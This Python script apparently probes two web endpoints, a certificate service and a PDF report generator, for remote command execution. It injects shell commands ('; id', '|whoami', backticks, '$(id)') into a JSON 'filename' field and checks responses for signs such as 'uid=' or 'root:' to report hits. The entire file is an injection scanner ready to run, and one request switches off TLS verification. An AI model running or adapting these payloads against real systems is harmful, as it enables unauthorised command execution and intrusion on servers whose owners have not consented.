import requests

cert_url = "*****"
pdf_url = "****"

cmds_cert = [
   
]

cmds_pdf = [
    '{"template":"monthly","filename":"report; id"}',
    '{"template":"monthly","filename":"report|whoami"}',
    '{"template":"monthly","filename":"report`id`"}',
    '{"template":"monthly","filename":"report$(id)"}',
]

heads = {"Content-Type": "application/json"}

signs = ["uid=", "gid=", "root:", "/bin/bash", "nt authority", "Volume in drive"]

for c in cmds_cert:
    try:
        r = requests.post(cert_url, data=c, headers=heads, timeout=10, verify=False)
        for s in signs:
            if s in r.text:
                print("cert rce: " + c[:50])
                print(r.text[:400])
                break
    except:
        pass

for c in cmds_pdf:
    try:
        r = requests.post(pdf_url, data=c, headers=heads, timeout=10)
        for s in signs:
            if s in r.text:
                print("pdf rce: " + c[:50])
                print(r.text[:400])
                break
    except:
        pass
